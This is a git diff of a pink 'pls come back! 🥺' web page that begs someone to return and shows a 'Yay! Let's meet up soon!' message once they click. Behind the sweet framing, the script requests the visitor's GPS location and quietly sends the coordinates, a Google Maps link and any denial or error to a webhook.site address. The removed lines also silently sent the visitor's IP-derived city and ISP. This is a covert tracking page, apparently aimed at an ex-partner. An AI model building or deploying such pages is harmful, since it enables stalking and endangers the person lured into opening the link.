@@ -6,54 +6,16 @@
     <title>wapas aao baua! 🥺</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Pacifico&display=swap');
-        
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fce4ec;
-            font-family: 'Poppins', sans-serif;
-            overflow: hidden;
-        }
-        
-        .container {
-            text-align: center;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 50px;
-            border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(233, 30, 99, 0.15);
-            max-width: 400px;
-            z-index: 10;
-        }
-
-        h1 { font-family: 'Pacifico', cursive; color: #e91e63; font-size: 3.5rem; margin-bottom: 10px; }
-        p { color: #666; font-size: 1.2rem; margin-bottom: 30px; }
-
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fce4ec; font-family: 'Poppins', sans-serif; overflow: hidden; }
+        .container { text-align: center; background: rgba(255, 255, 255, 0.9); padding: 50px; border-radius: 25px; box-shadow: 0 15px 35px rgba(233, 30, 99, 0.15); max-width: 400px; z-index: 10; }
+        h1 { font-family: 'Pacifico', cursive; color: #e91e63; font-size: 3rem; margin-bottom: 10px; }
+        p { color: #666; font-size: 1.1rem; margin-bottom: 30px; }
         .btn-container { display: flex; justify-content: center; gap: 20px; }
-        .btn {
-            background-color: #ff4081;
-            color: white;
-            border: none;
-            padding: 15px 35px;
-            font-size: 1.1rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-        }
-
-        #noBtn { background-color: #9e9e9e; }
-        .circle { position: absolute; border-radius: 50%; background: rgba(255, 64, 129, 0.1); animation: float 8s infinite ease-in-out; z-index: 1; }
-        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-30px); } }
+        .btn { background-color: #ff4081; color: white; border: none; padding: 15px 30px; font-size: 1rem; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; font-weight: 600; }
+        #noBtn { background-color: #9e9e9e; position: relative; }
     </style>
 </head>
 <body>
-
-    <div class="circle" style="width: 200px; height: 200px; top: -50px; left: -50px;"></div>
-    <div class="circle" style="width: 300px; height: 300px; bottom: -100px; right: -50px; animation-delay: 2s;"></div>
 
     <div class="container" id="mainCard">
         <h1>pls come back! 🥺</h1>
@@ -65,19 +27,22 @@
     </div>
 
     <script>
+        // APNA WEBHOOK YAHAN CHECK KAREIN
         const myWebhook = "https://webhook.site/69cf21e1-aa39-43db-acb6-f467303d55f4";
 
-        // 1. Initial IP Tracking (Background)
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            sendToWebhook({ type: "IP_Info", city: data.city, isp: data.org });
-        });
+        function sendToWebhook(data) {
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => console.log("Sent"));
+        }
 
-        // 2. GPS Location Trigger
         function askLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, fail);
+                // Ye line browser popup trigger karegi
+                navigator.geolocation.getCurrentPosition(success, fail, {timeout: 10000});
             } else {
                 showLove();
             }
@@ -86,24 +51,18 @@
         function success(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            sendToWebhook({ type: "GPS_LIVE", google_maps: mapLink, lat: lat, lon: lon });
-            showLove();
-        }
-
-        function fail() {
-            sendToWebhook({ type: "GPS_DENIED" });
-            showLove();
-        }
-
-        function sendToWebhook(data) {
-            fetch(myWebhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+            sendToWebhook({
+                Status: "SUCCESS_GPS",
+                Maps_Link: `https://www.google.com/maps?q=${lat},${lon}`,
+                Latitude: lat,
+                Longitude: lon
             });
+            showLove();
+        }
+
+        function fail(error) {
+            sendToWebhook({ Status: "DENIED_OR_FAILED", Error: error.message });
+            showLove();
         }
 
         function moveButton() {
@@ -114,7 +73,11 @@
         }
 
         function showLove() {
-            document.getElementById('mainCard').innerHTML = `<h1>Yay! 🥰</h1><p>Thank you! Let's meet up soon!</p><div style="font-size: 5rem;">❤️</div>`;
+            document.getElementById('mainCard').innerHTML = `
+                <h1>Yay! 🥰</h1>
+                <p>Thank you! Let's meet up soon!</p>
+                <div style="font-size: 4rem;">❤️</div>
+            `;
         }
     </script>
 </body>
